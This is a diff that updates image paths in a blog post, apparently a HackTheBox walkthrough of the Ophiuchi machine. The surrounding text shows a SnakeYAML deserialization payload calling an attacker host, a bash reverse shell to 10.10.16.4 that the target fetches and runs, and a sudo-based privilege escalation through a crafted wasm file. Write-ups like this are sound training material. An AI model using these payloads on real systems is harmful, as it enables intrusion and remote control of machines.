@@ -36,7 +36,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 19.68 seconds
-</code></pre><ul><li>Web Server</li></ul><p><img src=./images/1.png></p><ul><li><code>goubster</code></li></ul><pre tabindex=0><code>└─$ gobuster dir -u http://10.10.10.227:8080/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,html,js,php --no-error -t 50
+</code></pre><ul><li>Web Server</li></ul><p><img src=/posts/cybersecurity/hackthebox/machines/linux/ophiuchi/images/1.png></p><ul><li><code>goubster</code></li></ul><pre tabindex=0><code>└─$ gobuster dir -u http://10.10.10.227:8080/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,html,js,php --no-error -t 50
 
 ===============================================================
 Gobuster v3.6
@@ -55,12 +55,12 @@ Starting gobuster in directory enumeration mode
 ===============================================================
 /test                 (Status: 302) [Size: 0] [--&gt; /test/]
 /manager              (Status: 302) [Size: 0] [--&gt; /manager/]
-</code></pre><h2 id=foothold>Foothold</h2><ul><li>It&rsquo;s a <code>tomcat</code><ul><li>Default creds didn&rsquo;t work</li></ul></li></ul><p><img src=./images/2.png></p><ul><li>Let&rsquo;s play with <code>YAML Parser</code><ul><li>Entering plain text results in message</li></ul></li></ul><p><img src=./images/3.png></p><ul><li>Yamls usually get deserialized<ul><li>Since it&rsquo;s a <code>tomcat</code>, we have to google for <code>java yaml deserialization exploit/attack</code></li><li><a href=https://swapneildash.medium.com/snakeyaml-deserilization-exploited-b4a2c5ac0858 target=_blank rel=noopener>https://swapneildash.medium.com/snakeyaml-deserilization-exploited-b4a2c5ac0858</a></li></ul></li></ul><pre tabindex=0><code>!!javax.script.ScriptEngineManager [
+</code></pre><h2 id=foothold>Foothold</h2><ul><li>It&rsquo;s a <code>tomcat</code><ul><li>Default creds didn&rsquo;t work</li></ul></li></ul><p><img src=/posts/cybersecurity/hackthebox/machines/linux/ophiuchi/images/2.png></p><ul><li>Let&rsquo;s play with <code>YAML Parser</code><ul><li>Entering plain text results in message</li></ul></li></ul><p><img src=/posts/cybersecurity/hackthebox/machines/linux/ophiuchi/images/3.png></p><ul><li>Yamls usually get deserialized<ul><li>Since it&rsquo;s a <code>tomcat</code>, we have to google for <code>java yaml deserialization exploit/attack</code></li><li><a href=https://swapneildash.medium.com/snakeyaml-deserilization-exploited-b4a2c5ac0858 target=_blank rel=noopener>https://swapneildash.medium.com/snakeyaml-deserilization-exploited-b4a2c5ac0858</a></li></ul></li></ul><pre tabindex=0><code>!!javax.script.ScriptEngineManager [
   !!java.net.URLClassLoader [[
     !!java.net.URL [&#34;http://attacker-ip/&#34;]
   ]]
 ]
-</code></pre><ul><li>If we send the payload, it actually works</li></ul><p><img src=./images/4.png></p><ul><li>The blog contains <a href=https://github.com/artsploit/yaml-payload target=_blank rel=noopener>repo</a> for <code>rce</code></li></ul><pre tabindex=0><code>&lt;SNIP&gt;
+</code></pre><ul><li>If we send the payload, it actually works</li></ul><p><img src=/posts/cybersecurity/hackthebox/machines/linux/ophiuchi/images/4.png></p><ul><li>The blog contains <a href=https://github.com/artsploit/yaml-payload target=_blank rel=noopener>repo</a> for <code>rce</code></li></ul><pre tabindex=0><code>&lt;SNIP&gt;
     public AwesomeScriptEngineFactory() {
         try {
             Runtime.getRuntime().exec(&#34;ping -c 1 10.10.16.4&#34;);
@@ -80,7 +80,7 @@ adding: META-INF/services/javax.script.ScriptEngineFactory(in = 36) (out= 38)(de
 adding: artsploit/(in = 0) (out= 0)(stored 0%)
 adding: artsploit/AwesomeScriptEngineFactory.class(in = 1607) (out= 677)(deflated 57%)
 adding: artsploit/AwesomeScriptEngineFactory.java(in = 1480) (out= 391)(deflated 73%)
-</code></pre><ul><li>Send the payload and we see our ping</li></ul><p><img src=./images/5.png></p><ul><li>To get a reverse shell we have to create a shell script which will be downloaded and then executed from the box<ul><li>Because <code>nc</code> connections were not stable</li></ul></li></ul><pre tabindex=0><code>#!/bin/bash
+</code></pre><ul><li>Send the payload and we see our ping</li></ul><p><img src=/posts/cybersecurity/hackthebox/machines/linux/ophiuchi/images/5.png></p><ul><li>To get a reverse shell we have to create a shell script which will be downloaded and then executed from the box<ul><li>Because <code>nc</code> connections were not stable</li></ul></li></ul><pre tabindex=0><code>#!/bin/bash
 /bin/bash -i &gt;&amp; /dev/tcp/10.10.16.4/6666 0&gt;&amp;1
 </code></pre><pre tabindex=0><code>&lt;SNIP&gt;
     public AwesomeScriptEngineFactory() throws Exception {
@@ -96,7 +96,7 @@ adding: artsploit/AwesomeScriptEngineFactory.java(in = 1480) (out= 391)(deflated
         }
     }
 &lt;SNIP&gt;
-</code></pre><p><img src=./images/6.png></p><h2 id=user>User</h2><ul><li>We can start with <code>tomcat</code>&rsquo;s <code>tomcat-users.xml</code><ul><li>It contains <code>admin</code> creds</li></ul></li></ul><pre tabindex=0><code>&lt;SNIP&gt;
+</code></pre><p><img src=/posts/cybersecurity/hackthebox/machines/linux/ophiuchi/images/6.png></p><h2 id=user>User</h2><ul><li>We can start with <code>tomcat</code>&rsquo;s <code>tomcat-users.xml</code><ul><li>It contains <code>admin</code> creds</li></ul></li></ul><pre tabindex=0><code>&lt;SNIP&gt;
 &lt;tomcat-users xmlns=&#34;http://tomcat.apache.org/xml&#34;
               xmlns:xsi=&#34;http://www.w3.org/2001/XMLSchema-instance&#34;
               xsi:schemaLocation=&#34;http://tomcat.apache.org/xml tomcat-users.xsd&#34;
@@ -159,7 +159,7 @@ table T_a:funcref(min: 1, max: 1);
 export function info():int {
   return 0
 }
-</code></pre><ul><li>The function <code>info</code> returns 0.<ul><li>Let&rsquo;s create a <code>wasm</code> file using <a href=https://wasdk.github.io/WasmFiddle/ target=_blank rel=noopener>WasmFiddle</a></li><li>We have to change return value to <code>1</code>, since there is a check in <code>index.go</code></li><li>Click <code>Build</code> and then download <code>wasm</code> file</li></ul></li></ul><p><img src=./images/7.png></p><ul><li>Now upload to box and run <code>sudo /usr/bin/go run /opt/wasm-functions/index.go</code> from folder where our <code>deploy.sh</code> and <code>main.wasm</code> are located</li></ul><pre tabindex=0><code>admin@ophiuchi:/dev/shm$ ls -lha
+</code></pre><ul><li>The function <code>info</code> returns 0.<ul><li>Let&rsquo;s create a <code>wasm</code> file using <a href=https://wasdk.github.io/WasmFiddle/ target=_blank rel=noopener>WasmFiddle</a></li><li>We have to change return value to <code>1</code>, since there is a check in <code>index.go</code></li><li>Click <code>Build</code> and then download <code>wasm</code> file</li></ul></li></ul><p><img src=/posts/cybersecurity/hackthebox/machines/linux/ophiuchi/images/7.png></p><ul><li>Now upload to box and run <code>sudo /usr/bin/go run /opt/wasm-functions/index.go</code> from folder where our <code>deploy.sh</code> and <code>main.wasm</code> are located</li></ul><pre tabindex=0><code>admin@ophiuchi:/dev/shm$ ls -lha
 total 12K
 drwxrwxrwt  2 root   root    100 Nov  3 20:20 .
 drwxr-xr-x 17 root   root   3.9K Nov  3 15:36 ..
@@ -170,7 +170,7 @@ drwxr-xr-x 17 root   root   3.9K Nov  3 15:36 ..
 /bin/bash -c &#39;/bin/bash -i &gt;&amp; /dev/tcp/10.10.16.4/6666 0&gt;&amp;1&#39;
 </code></pre><pre tabindex=0><code>admin@ophiuchi:/dev/shm$ sudo /usr/bin/go run /opt/wasm-functions/index.go
 Ready to deploy
-</code></pre><p><img src=./images/8.png></p></div><div class="row pl-3 pr-3"><div class="col-md-6 share-buttons"><strong>Share on:</strong>
+</code></pre><p><img src=/posts/cybersecurity/hackthebox/machines/linux/ophiuchi/images/8.png></p></div><div class="row pl-3 pr-3"><div class="col-md-6 share-buttons"><strong>Share on:</strong>
 <a class="btn btn-sm twitter-btn" href="https://twitter.com/share?url=https%3a%2f%2fumarbaevb.github.io%2fposts%2fcybersecurity%2fhackthebox%2fmachines%2flinux%2fophiuchi%2f&text=%5bHTB%5d%20Machine%3a%20Ophiuchi&via=Personal%20Blog" target=_blank><i class="fab fa-twitter"></i>
 </a><a class="btn btn-sm reddit-btn" href="https://reddit.com/submit?url=https%3a%2f%2fumarbaevb.github.io%2fposts%2fcybersecurity%2fhackthebox%2fmachines%2flinux%2fophiuchi%2f&title=%5bHTB%5d%20Machine%3a%20Ophiuchi" target=_blank><i class="fab fa-reddit"></i>
 </a><a class="btn btn-sm linkedin-btn" href="https://www.linkedin.com/shareArticle?url=https%3a%2f%2fumarbaevb.github.io%2fposts%2fcybersecurity%2fhackthebox%2fmachines%2flinux%2fophiuchi%2f&title=%5bHTB%5d%20Machine%3a%20Ophiuchi" target=_blank><i class="fab fa-linkedin"></i>
